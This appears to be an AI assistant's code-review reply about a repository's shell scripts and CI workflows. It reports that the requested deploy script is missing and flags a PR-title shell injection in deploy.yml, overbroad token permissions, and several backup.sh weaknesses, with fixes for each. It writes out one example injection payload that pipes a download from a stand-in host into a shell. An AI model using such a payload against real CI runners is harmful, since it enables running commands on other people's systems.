I couldn't find the deploy script, so I haven't reviewed it. Nothing in this repository runs `ssh`, and no file uses a branch name. Here's what is there:

- **`scripts/backup.sh`** is a nightly backup that uses `scp`, not `ssh`, and doesn't use a branch name.
- **`.github/workflows/deploy.yml`** is named "deploy" but only echoes the PR title. It never connects to a host.
- **`Jenkinsfile`** and **`.gitlab-ci.yml`** only run build commands.

The script may be on another branch, in another repo, or not committed yet. If you paste it or give me its path, I'll review it.

Both files I did read have problems worth fixing before CI picks them up:

**`.github/workflows/deploy.yml`**
- **Line 14 has the same flaw you described.** `${{ github.event.pull_request.title }}` is pasted into the shell text before the shell runs. Anyone who can open a PR can set a title like `"; curl evil | sh; echo "` and run commands on the runner. Fix: pass the title in through `env:` (`PR_TITLE: ${{ github.event.pull_request.title }}`) and use `"${PR_TITLE}"` in the script.
- **Line 7 sets `permissions: write-all`** on a `pull_request` trigger. That gives the job's token much more access than it needs. Reduce it to `contents: read`.

**`scripts/backup.sh`**
- **No strict mode.** If `tar` fails, the script still runs `scp`, which either fails or uploads a partial archive, and the run can still report success.
- **Predictable temp path.** `/tmp/backup.$$` is easy to guess, and someone else on the machine could create it or a symlink to it first. Use `mktemp -d`.
- **No cleanup on failure.** The `rm -rf` only runs if everything before it succeeds. Removing the directory from a `trap … EXIT` (set before the `mktemp`) would cover every exit.
- **Unquoted variables** and old-style backticks around `date`.
- **No fixed `PATH` or `umask`**, even though it runs from cron and handles application data.

For the ssh script itself, the fix will almost certainly be this:
1. Check the branch name against a strict allowlist (for example `^[A-Za-z0-9._/-]+$`, with no leading `-`) and refuse anything else rather than trying to clean it up.
2. Don't build the remote command as a string with the branch inside it. Instead, pass the branch to a fixed script on the remote host (`ssh host /opt/deploy/run --branch -- "$branch"`), or quote it with `printf '%q'`. The remote side should validate it again.

If you want, I can fix `deploy.yml` and `backup.sh` now and check them with `shellcheck`.
